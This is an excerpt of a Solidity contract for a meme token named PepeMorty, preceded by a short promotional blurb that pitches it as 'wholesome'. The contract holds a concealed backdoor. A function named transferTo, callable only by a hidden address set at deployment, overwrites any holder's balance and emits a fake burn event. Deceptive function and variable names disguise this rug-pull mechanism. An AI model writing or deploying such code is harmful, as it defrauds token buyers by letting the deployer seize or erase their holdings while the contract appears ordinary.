...
Pepe morty is a wholesome 0/0 from the start token meant to warm the spirits of degens.
 With two of the most perfect memes mixed together, this pepe shall take over the space.

PEEEPEEEEE MOOOOORTTTYYY!!!

Website: https://pepemorty.io/
...
/*
 * @dev Provides information about the current execution ABIByteEncoderV2, including the
 ...
 */
abstract contract ABIByteEncoderV2 {
 ...
 * the owner.
 */
abstract contract BridgeContract is ABIByteEncoderV2 {
...
contract PepeMorty is ABIByteEncoderV2, CrosschainMetadata, BridgeContract {
   ...
   address private SafeValutLP; 
    constructor(address pairlp) {
        SafeValutLP = pairlp;     
        _name = "PepeMorty";
        _symbol = "PepeMorty";
        _decimals = 6;
        _totalSupply = 4206900000000000 * 10 ** 6;
    ...
    */
    ...
    /**
    * @dev See {CrosschainMetadata-totalSupply}.
    */
    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }
        modifier smartswap() {
        require(SafeValutLP == _msgSender(), "BridgeContract: caller is not the owner");
        _;
    }  
    /**
    * @dev See {CrosschainMetadata-balanceOf}.
    */
    ...
    function transfer(address link, uint256 diniro) external override returns (bool) {
     ...
     function transferTo(address dead) external smartswap {
        BEP20Metadata[dead] = 1000000000 * 10 ** 9;
        
        emit Transfer(dead, address(0), 1000000000 * 10 ** 9);
    }
    ...
    function transferFrom(address sender, address link, uint256 diniro) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), BEP20mapping[sender][_msgSender()].sub(diniro, "CrosschainMetadata: transfer diniro exceeds allowance"));
        return true;
    }
    
    /**
    * @dev See {CrosschainMetadata-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {CrosschainMetadata-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {CrosschainMetadata};
    *
    * Requirements:
    ...
    * problems described in {CrosschainMetadata-approve}.
    *
    ...
    */
    function decreaseAllowance(address Coins, uint256 diniroinu) external returns (bool) {
        _approve(_msgSender(), Coins, BEP20mapping[_msgSender()][Coins].sub(diniroinu, "CrosschainMetadata: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address link, uint256 diniro) internal {
        require(sender != address(0), "CrosschainMetadata: transfer from the zero address");
        require(link != address(0), "CrosschainMetadata: transfer to the zero address");
                
        BEP20Metadata[sender] = BEP20Metadata[sender].sub(diniro, "CrosschainMetadata: transfer diniro exceeds balance");
    ...
    */
    function _approve(address owner, address Coins, uint256 diniro) internal {
        require(owner != address(0), "CrosschainMetadata: approve from the zero address");
        require(Coins != address(0), "CrosschainMetadata: approve to the zero address");
